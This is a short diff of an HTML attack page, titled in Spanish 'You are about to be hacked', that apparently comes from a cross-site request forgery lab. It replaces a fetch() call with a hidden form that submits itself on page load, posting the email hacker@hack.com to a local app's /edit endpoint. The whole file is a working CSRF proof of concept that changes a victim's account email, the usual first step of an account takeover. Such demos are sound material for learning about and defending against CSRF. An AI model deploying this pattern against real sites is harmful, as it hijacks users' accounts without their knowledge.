@@ -7,19 +7,11 @@
 </head>
 <body>
   <h1>Estas a punto de ser hackeado</h1>
+  <form id="form" action="http://localhost:3000/edit" method="POST">
+    <input type="hidden" name="email" value="hacker@hack.com">
+  </form>
   <script>
-    fetch('http://localhost:3000/edit', {
-      method: 'POST',
-      credentials: 'include',
-      mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-      body: 'email=hacker@hack.com',
-    })
-      .then(res => res.text())
-      .then(text => console.log(text))
-      .catch(err => console.log(err))
+    document.getElementById('form').submit();
   </script>
 </body>
 </html>
